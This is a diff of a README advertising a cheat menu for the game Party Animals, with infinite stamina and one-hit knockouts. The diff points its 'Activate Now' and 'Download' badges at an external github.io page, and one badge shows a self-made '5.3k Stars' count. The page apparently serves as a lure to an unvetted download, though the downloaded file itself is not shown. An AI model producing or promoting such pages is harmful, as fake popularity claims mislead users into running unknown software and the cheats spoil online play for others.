@@ -2,10 +2,10 @@
 
 The **Party Animals Cheat Menu Software** gives you a playful overlay for toggling hilarious boosts and match controls in real time. Instead of relying only on hotkeys, you get a **clean on-screen menu** to activate infinite stamina, jump boosts, or one-hit knockouts instantly.
 
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-purple?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 5.3k Stars](https://img.shields.io/badge/⭐️%205.3k-Stars-yellow?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](#)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-purple?style=for-the-badge\&logo=rocket)](https://party-animals-cheat-menu.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://party-animals-cheat-menu.github.io/.github/)
+[![⭐️ 5.3k Stars](https://img.shields.io/badge/⭐️%205.3k-Stars-yellow?style=for-the-badge\&logo=github)](https://party-animals-cheat-menu.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](https://party-animals-cheat-menu.github.io/.github/)
 
 ---
 
